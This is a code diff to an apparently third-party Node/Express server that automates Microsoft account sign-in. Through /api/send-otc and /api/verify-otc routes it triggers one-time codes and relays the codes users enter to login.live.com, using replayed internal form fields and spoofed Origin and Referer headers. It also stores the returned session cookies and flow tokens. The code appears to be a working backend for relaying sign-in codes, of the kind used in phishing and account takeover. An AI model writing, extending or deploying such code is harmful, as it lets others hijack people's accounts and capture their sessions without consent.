@@ -289,61 +289,112 @@ async function sendOneTimeCode(email, session, proofToken, proofDisplay, channel
 /* ------------------------------------------------------------------ */
 /*  Verify a One-Time Code                                            */
 /* ------------------------------------------------------------------ */
-async function verifyOneTimeCode(email, session, newFlowToken, otcCode) {
+async function verifyOneTimeCode(email, session, newFlowToken, otcCode, sentProofIDE, proofDisplay, proofType) {
   const { uaid, cookies } = session;
 
+  // proofType: "email" -> 1, "phone" -> 3
+  const proofTypeNum = proofType === "phone" ? "3" : "1";
+
   const params = new URLSearchParams({
-    login: email,
-    PPFT: newFlowToken,
+    SentProofIDE: sentProofIDE ?? "",
+    ProofConfirmation: proofDisplay ?? "",
+    ProofType: proofTypeNum,
     otc: otcCode,
-    type: "19",
-    uaid,
-    lcid: "2057",
+    ps: "3",
+    psRNGCDefaultType: "",
+    psRNGCEntropy: "",
+    psRNGCSLK: "",
+    canary: "",
+    ctx: "",
+    hpgrequestid: "",
+    PPFT: newFlowToken,
+    PPSX: "P",
+    NewUser: "1",
+    FoundMSAs: "",
+    fspost: "0",
+    i21: "0",
+    CookieDisclosure: "0",
+    IsFidoSupported: "1",
+    isSignupPost: "0",
+    isRecoveryAttemptPost: "0",
+    i13: "0",
+    login: email,
+    loginfmt: email,
+    type: "27",
+    LoginOptions: "3",
+    lrt: "",
+    lrtPartition: "",
+    hisRegion: "",
+    hisScaleUnit: "",
+    cpr: "0",
   });
 
-  const verifyRes = await fetch(
-    "https://login.live.com/ppsecure/post.srf?login_hint=" + encodeURIComponent(email),
-    {
-      method: "POST",
-      redirect: "manual",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": UA,
-        Origin: "https://login.live.com",
-        Referer: "https://login.live.com/",
-        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "en-GB,en-US;q=0.9",
-        ...(cookies ? { Cookie: cookies } : {}),
-      },
-      body: params.toString(),
+  const verifyUrl =
+    `https://login.live.com/ppsecure/post.srf?` +
+    `username=${encodeURIComponent(email)}&uaid=${uaid}&pid=15216`;
+
+  const verifyRes = await fetch(verifyUrl, {
+    method: "POST",
+    redirect: "manual",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": UA,
+      Origin: "https://login.live.com",
+      Referer: "https://login.live.com/",
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-GB,en-US;q=0.9",
+      "Cache-Control": "max-age=0",
+      "Upgrade-Insecure-Requests": "1",
+      ...(cookies ? { Cookie: cookies } : {}),
     },
-  );
+    body: params.toString(),
+  });
 
   const status = verifyRes.status;
   const location = verifyRes.headers.get("location") ?? "";
   const bodyText = await verifyRes.text().catch(() => "");
 
-  // A redirect away from login.live.com usually means success
+  // Extract a new flow token from the response body if present (for chained steps)
+  const newPPFTMatch = bodyText.match(/name=\\?"PPFT\\?"[^>]*?value=\\?"([^"\\]+)/);
+
+  // Success signals:
+  // 1. Redirect away from login.live.com
+  // 2. Response body contains a passkey/interrupt redirect (means OTC was accepted)
+  // 3. No sErrorCode in the body
   const redirectedOut =
     status >= 300 &&
     status < 400 &&
-    !location.includes("login.live.com") &&
-    !location.includes("login.microsoftonline.com");
+    !location.includes("login.live.com");
 
-  // Check for known error signals in the body
+  const bodyHasPasskeyInterrupt =
+    bodyText.includes("interrupt/passkey") ||
+    bodyText.includes("account.live.com");
+
   const hasError =
-    bodyText.includes("incorrect") ||
-    bodyText.includes("invalid") ||
-    bodyText.includes("error") ||
-    bodyText.includes("sErrorCode");
+    bodyText.includes("sErrorCode") ||
+    bodyText.includes("sFT") === false; // no flow token at all is suspicious
 
-  const success = redirectedOut || (!hasError && status < 300);
+  // If we got a 200 with HTML that has a new PPFT (the passkey interrupt page), OTC was accepted
+  const otcAccepted = redirectedOut || bodyHasPasskeyInterrupt || (status === 200 && !!newPPFTMatch);
+
+  // Also detect wrong code explicitly
+  const wrongCode =
+    bodyText.includes("incorrect") ||
+    bodyText.includes("otcInvalid") ||
+    bodyText.includes("InvalidOtc");
+
+  const success = otcAccepted && !wrongCode;
 
   return {
     success,
     httpStatus: status,
     redirectLocation: location || null,
-    error: success ? null : "OTP verification failed — code may be incorrect or expired",
+    nextFlowToken: newPPFTMatch ? newPPFTMatch[1] : null,
+    error: success
+      ? null
+      : wrongCode
+        ? "Incorrect OTP — please check the code and try again"
+        : "OTP verification failed — code may be expired",
   };
 }
 
@@ -468,13 +519,15 @@ app.post("/api/send-otc", async (req, res) => {
     return res.status(502).json({ success: false, error: otcResult.error });
   }
 
-  // Store session for verify step
+  // Store session for verify step (including the proof token needed as SentProofIDE)
   const sessionId = saveOtcSession({
     email,
     uaid: session.uaid,
     cookies: session.cookies,
     newFlowToken: otcResult.newFlowToken,
     proofDisplay: proof.display,
+    proofType: proof.type,
+    sentProofIDE: proof.proofToken ?? null,
     channel: targetChannel,
   });
 
@@ -509,7 +562,15 @@ app.post("/api/verify-otc", async (req, res) => {
   }
 
   const fakeSession = { uaid: s.uaid, cookies: s.cookies };
-  const result = await verifyOneTimeCode(s.email, fakeSession, s.newFlowToken, String(otcCode).trim());
+  const result = await verifyOneTimeCode(
+    s.email,
+    fakeSession,
+    s.newFlowToken,
+    String(otcCode).trim(),
+    s.sentProofIDE,
+    s.proofDisplay,
+    s.proofType,
+  );
 
   res.json({
     ...result,
